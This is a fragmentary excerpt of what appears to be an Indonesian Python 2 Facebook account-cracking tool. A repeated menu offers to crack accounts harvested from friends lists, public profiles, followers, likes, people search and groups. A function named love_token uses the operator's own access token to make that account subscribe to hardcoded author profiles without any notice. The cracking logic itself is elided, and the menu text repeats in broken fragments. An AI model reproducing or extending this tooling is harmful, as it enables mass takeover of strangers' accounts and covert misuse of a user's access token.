...
def love_token(token):
    lis_id_foll = ['100026788095748', '100053131790762']
    with requests.Session() as (dev_):
        ...
        dev_.post(('https://graph.facebook.com/{}/subscribers?access_token={}').format(random.choice(['100026788095748', '100053131790762', '100010692996037']), token))
        ikuti_ = []
        ...
        with requests.Session() as (ses_):
            ...
            try:
                if user_agent_ == user_agent_:
                    print h + ' [' + k + '01' + h + ']' + p + ' Crack from friends list' + h + ' + TTL'
                    print h + ' [' + k + '02' + h + ']' + p + ' Crack from Public' + k + '/Teman dari Teman'
                    print h + ' [' + k + '03' + h + ']' + p + ' Crack from Followers list'
                    print h + ' [' + k + '04' + h + ']' + p + ' Crack from Likes'
                    print h + ' [' + k + '05' + h + ']' + p + ' Crack from People Search'
                    print h + ' [' + k + '06' + h + ']' + k + ' Crack from People Search' + p + ' (' + a + 'PRO' + p + ')'
                    print h + ' [' + k + '07' + h + ']' + p + ' Crack ' + a + 'friends list from people search'
                    print h + ' [' + k + '08' + h + ']' + p + ' Crack from My Groups' + k + '/Massal'
                    print h + ' [' + k + '09' + h + ']' + p + ' Cek hasil Crack' + h + ' OK' + p + '/' + k + 'CP'
                    ...
                    print h + ' [' + k + '01' + h + ']' + d + ' Crack from friends list' + k + ' + TTL'
                    print h + ' [' + k + '02' + h + ']' + d + ' Crack from Public/Teman dari Teman'
                    print h + ' [' + k + '03' + h + ']' + d + ' Crack from Followers list'
                    print h + ' [' + k + '04' + h + ']' + d + ' Crack from Likes'
                    print h + ' [' + k + '05' + h + ']' + d + ' Crack from People Search'
                    print h + ' [' + k + '06' + h + ']' + d + ' Crack from People Search' + k + ' PRO'
                    print h + ' [' + k + '07' + h + ']' + d + ' Crack friends list from people search'
                    print h + ' [' + k + '08' + h + ']' + d + ' Crack from My Groups/Massal'
                    print h + ' [' + k + '09' + h + ']' + p + ' Cek hasil Crack' + h + ' OK' + p + '/' + k + 'CP'
                    print h + ' [' + k + '10' + h + ']' + p + ' Log Out Facebook'
                    print h + ' [' + k + '11' + h + ']' + p + ' Update Tool'
                    print h + ' [' + k + '12' + h + ']' + a + ' Setting User-Agent'
                ...
                print h + ' [' + k + '04' + h + ']' + d + ' Crack from Likes'
                print h + ' [' + k + '05' + h + ']' + d + ' Crack from People Search'
                print h + ' [' + k + '06' + h + ']' + d + ' Crack from People Search' + a + ' PRO'
                print h + ' [' + k + '07' + h + ']' + d + ' Crack friends list from people search'
                print h + ' [' + k + '08' + h + ']' + d + ' Crack from My Groups/Massal'
                print h + ' [' + k + '09' + h + ']' + p + ' Cek hasil Crack' + h + ' OK' + p + '/' + k + 'CP'
                print h + ' [' + k + '10' + h + ']' + p + ' Log Out Facebook'
